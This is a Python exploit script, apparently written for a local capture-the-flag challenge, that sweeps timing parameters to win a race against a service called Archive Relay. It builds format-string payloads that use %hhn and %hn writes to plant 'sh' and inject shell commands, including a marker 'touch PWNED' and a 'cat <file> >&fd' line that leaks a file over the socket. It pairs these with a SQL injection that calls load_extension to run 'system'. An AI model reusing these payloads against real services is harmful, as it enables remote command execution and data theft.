#!/usr/bin/env python3
"""Local timing sweep for the Archive Relay ``sh *`` command primitive."""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
from pathlib import Path
import random
import select
import socket
import subprocess
import time
import urllib.parse


ROOT = Path(__file__).resolve().parent
PROB = ROOT / "package" / "deploy" / "prob"

spec = importlib.util.spec_from_file_location("archive_flag", ROOT / "archive_flag_agent.py")
archive = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(archive)


def safe_final_note(script_line: str, tail_width: int = 0) -> str:
    """Write db[0:2] = b'sh' and append a filter-safe audit script line."""
    if not script_line.endswith(" "):
        raise ValueError("script line must end with one space before the generated comment")
    if any(character in script_line for character in "#>&;"):
        raise ValueError("script line contains a trace-filtered metacharacter")
    chunks = ["%199c"]
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")              # arg137 -> arg185 = LF
    chunks.append("%254c")             # arg138, count low db+0 (0x08)
    chunks.extend(["%.s"] * 14)        # args139..152
    chunks.append("%hhn")              # arg153 -> arg179 = db+0
    chunks.append("%2c")               # arg154, count low LF
    chunks.extend(["%.s"] * 30)        # args155..184; precision zero is safe
    chunks.append("%c")                # arg185 -> LF, total count 523
    chunks.append(script_line)
    chunks.append("%31$c")             # generated '#': comment the audit suffix
    width = 0x6873 - (523 + len(script_line) + 1)
    if width <= 0:
        raise ValueError("script line is too long for the sh halfword count")
    chunks.append(f"%07${width}c")
    chunks.append("%179$hn")           # db[0:2] = b'sh'
    if tail_width:
        chunks.append(f"%07${tail_width}c")
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def marker_final_note(tail_width: int) -> str:
    """Local marker form of :func:`safe_final_note`."""
    return safe_final_note("touch PWNED ", tail_width)


def redirect_final_note(source: str, server_fd: int) -> str:
    """Write ``sh`` and synthesize a new ``cat SOURCE >&FD`` audit line."""
    if not source.startswith("/") or any(character in source for character in " #>&;$()`'\""):
        raise ValueError("source must be a simple absolute path")
    if not 0 <= server_fd <= 9:
        raise ValueError("this compact payload supports one-digit descriptors")
    command_prefix = f"cat {source} "
    chunks = ["%227c"]                  # total 294, low byte '&'
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")               # arg137 -> arg185 = '&'
    chunks.append("%226c")              # arg138, total 520, low db+0
    chunks.extend(["%.s"] * 14)        # args139..152
    chunks.append("%hhn")               # arg153 -> arg179 = db+0
    chunks.append("%54c")               # arg154, total 574, low byte '>'
    chunks.extend(["%.s"] * 9)         # args155..163
    chunks.append("%hhn")               # arg164 -> arg183 = '>'
    chunks.append("%204c")              # arg165, total 778, low byte LF
    chunks.extend(["%.s"] * 4)         # args166..169
    chunks.append("%hhn")               # arg170 -> arg177 = LF
    chunks.append("%25960c")            # arg171, total 0x6872
    chunks.extend(["%.s"] * 5)         # args172..176
    chunks.append("%c")                 # arg177 -> LF, total 0x6873
    chunks.append("%.s")                # arg178
    chunks.append("%hn")                # arg179 -> db[0:2] = b'sh'
    chunks.append(command_prefix)
    chunks.extend(["%.s"] * 3)         # args180..182
    chunks.append("%c")                 # arg183 -> '>'
    chunks.append("%.s")                # arg184
    chunks.append("%c")                 # arg185 -> '&'
    chunks.append(f"{server_fd} ")
    chunks.append("%31$c")              # generated '#': comment audit suffix
    count = 0x6873 + len(command_prefix) + 2 + len(f"{server_fd} ") + 1
    restore_pad = (-count) & 0xFF
    if restore_pad == 0:
        restore_pad = 256
    chunks.append(f"%07${restore_pad}c")
    chunks.append("%164$hhn")            # restore arg183's original NULL low byte
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def combined_marker_note() -> str:
    """Atomically form ``sh *`` and append the marker in one trace record."""
    marker = "touch PWNED "
    chunks = ["%199c"]                  # total 266, low byte LF/db+2
    chunks.extend(["%.s"] * 135)       # args2..136
    chunks.append("%hhn")               # arg137 -> arg185 = LF
    chunks.extend(["%.s"] * 15)        # args138..152
    chunks.append("%hhn")               # arg153 -> arg179 = db+2
    chunks.append("%10518c")            # arg154, total 0x2a20
    chunks.extend(["%.s"] * 24)        # args155..178
    chunks.append("%n")                 # db[2:6] = b' *\\0\\0'
    chunks.extend(["%.s"] * 5)         # args180..184
    chunks.append("%c")                 # arg185 -> LF, total 0x2a21
    chunks.append(marker)
    chunks.append("%31$c")              # generated '#', total 0x2a2e
    chunks.append("%07$218c")           # total low byte 0x08
    chunks.append("%153$hhn")           # arg179 -> db+0
    chunks.append("%07$15723c")         # total 0x6873
    chunks.append("%179$hn")            # db[0:2] = b'sh'
    note = "".join(chunks)
    if len(note) > 760:
        raise AssertionError(len(note))
    return note


def login_wire(host: str, port: int, library: str) -> bytes:
    sql = f"x' UNION SELECT load_extension('{library}','system') -- "
    account = urllib.parse.quote(urllib.parse.quote(sql, safe=""), safe="")
    body = f"account={account}&pin=x".encode()
    return (
        f"POST /api/login HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + body


def recv_all(sockets: list[socket.socket], timeout: float = 3.0) -> list[bytes]:
    buffers = [bytearray() for _ in sockets]
    by_fd = {sock.fileno(): index for index, sock in enumerate(sockets)}
    live = set(sockets)
    deadline = time.monotonic() + timeout
    while live and time.monotonic() < deadline:
        readable, _, _ = select.select(list(live), [], [], 0.05)
        for sock in readable:
            index = by_fd[sock.fileno()]
            try:
                data = sock.recv(65536)
            except (ConnectionResetError, OSError):
                data = b""
            if data:
                buffers[index].extend(data)
            else:
                live.remove(sock)
    for sock in sockets:
        sock.close()
    return [bytes(buffer) for buffer in buffers]


def wait_port(port: int) -> None:
    deadline = time.monotonic() + 2.0
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.05):
                return
        except OSError:
            time.sleep(0.01)
    raise RuntimeError("local service did not open")


def busy_wait_us(value: int) -> None:
    target = time.perf_counter_ns() + value * 1000
    while time.perf_counter_ns() < target:
        pass


def race(
    port: int,
    session: str,
    notes: list[str],
    delay_us: int,
    trace_gap_us: int,
    library: str,
) -> list[bytes]:
    host = "127.0.0.1"
    login_sock = socket.create_connection((host, port), timeout=2)
    trace_socks = [socket.create_connection((host, port), timeout=2) for _ in notes]
    login_request = login_wire(host, port, library)
    trace_requests = [archive.raw_trace_request(host, port, session, note) for note in notes]
    if delay_us >= 0:
        for item_index, (sock, request) in enumerate(zip(trace_socks, trace_requests)):
            sock.sendall(request)
            if item_index + 1 < len(trace_socks):
                busy_wait_us(trace_gap_us)
        busy_wait_us(delay_us)
        login_sock.sendall(login_request)
    else:
        login_sock.sendall(login_request)
        busy_wait_us(-delay_us)
        for item_index, (sock, request) in enumerate(zip(trace_socks, trace_requests)):
            sock.sendall(request)
            if item_index + 1 < len(trace_socks):
                busy_wait_us(trace_gap_us)
    return recv_all([login_sock, *trace_socks])


def attempt(index: int, params: tuple[int, int, int, int, int], base_port: int) -> dict[str, object]:
    delay_us, trace_gap_us, gate_width, seed_tail, final_tail = params
    port = base_port + index
    run_dir = f"{ROOT}/root_sh_sweep/{index:03d}_{delay_us:+05d}_{trace_gap_us}_{gate_width}_{seed_tail}_{final_tail}"
    os.makedirs(run_dir, exist_ok=True)
    log_handle = open(f"{run_dir}/prob.log", "wb")
    process = subprocess.Popen(
        [PROB, str(port)],
        cwd=run_dir,
        stdin=subprocess.DEVNULL,
        stdout=log_handle,
        stderr=subprocess.STDOUT,
    )
    try:
        wait_port(port)
        session = archive.login(port)
        enable = archive.write_note(0x32, 0x07, "hhn")
        status, body = archive.trace(port, session, enable)
        if status != 202:
            raise RuntimeError((status, body))
        time.sleep(0.08)
        notes = [
            f"%{gate_width}c",
            archive.write_note(0x02, 0x2A20, "n", tail_width=seed_tail),
            marker_final_note(final_tail),
        ]
        library = "/proc/self/root" * 5 + "/usr/lib/x86_64-linux-gnu/libkrb5.so.3"
        responses = race(port, session, notes, delay_us, trace_gap_us, library)
        time.sleep(0.08)
        won = os.path.exists(f"{run_dir}/PWNED")
        return {
            "index": index,
            "delay_us": delay_us,
            "trace_gap_us": trace_gap_us,
            "gate_width": gate_width,
            "seed_tail": seed_tail,
            "final_tail": final_tail,
            "won": won,
            "alive": process.poll() is None,
            "response_lengths": [len(item) for item in responses],
        }
    except Exception as error:
        return {
            "index": index,
            "delay_us": delay_us,
            "trace_gap_us": trace_gap_us,
            "gate_width": gate_width,
            "seed_tail": seed_tail,
            "final_tail": final_tail,
            "won": False,
            "alive": process.poll() is None,
            "error": repr(error),
        }
    finally:
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=1)
            except subprocess.TimeoutExpired:
                process.kill()
        log_handle.close()


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--limit", type=int, default=160)
    parser.add_argument("--base-port", type=int, default=19600)
    args = parser.parse_args()
    grid = [
        (delay, trace_gap, gate, seed_tail, final_tail)
        for delay in (-3000, -2000, -1500, -1000, -500, 0, 250, 500, 750, 1000, 1500)
        for trace_gap in (100, 250, 500, 1000)
        for gate in (200000, 500000, 1000000, 1500000)
        for seed_tail in (0, 100000, 300000, 500000)
        for final_tail in (100000, 500000)
    ]
    random.Random(0x5348).shuffle(grid)
    results: list[dict[str, object]] = []
    for index, params in enumerate(grid[: args.limit]):
        row = attempt(index, params, args.base_port)
        results.append(row)
        print(json.dumps(row, sort_keys=True), flush=True)
        if row.get("won"):
            break
    with open(f"{ROOT}/root_sh_sweep_results.json", "w", encoding="utf-8") as handle:
        json.dump(results, handle, indent=2, sort_keys=True)


if __name__ == "__main__":
    main()
